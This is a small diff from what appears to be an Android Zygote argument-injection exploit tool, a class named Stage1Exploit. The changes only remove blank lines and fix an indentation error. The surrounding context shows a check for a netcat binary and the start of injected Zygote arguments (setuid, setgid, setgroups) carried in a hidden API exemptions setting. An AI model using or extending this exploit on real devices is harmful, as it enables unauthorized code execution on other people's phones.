@@ -179,8 +179,6 @@ class Stage1Exploit:
         else:
             raise ZygoteInjectionException("netcat binary was not found")
 
-   
-
     @staticmethod
     def generate_stage1_exploit(command: str, exploit_type: str) -> str:
         "generates the hidden_api_blacklist_exemptions value to trigger the exploit"
@@ -188,7 +186,7 @@ class Stage1Exploit:
         # commas don't work because they're treated as a separator
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
-         raw_zygote_arguments = [
+        raw_zygote_arguments = [
             "--setuid=10079",
             "--setgid=10079",
             "--setgroups=3003",
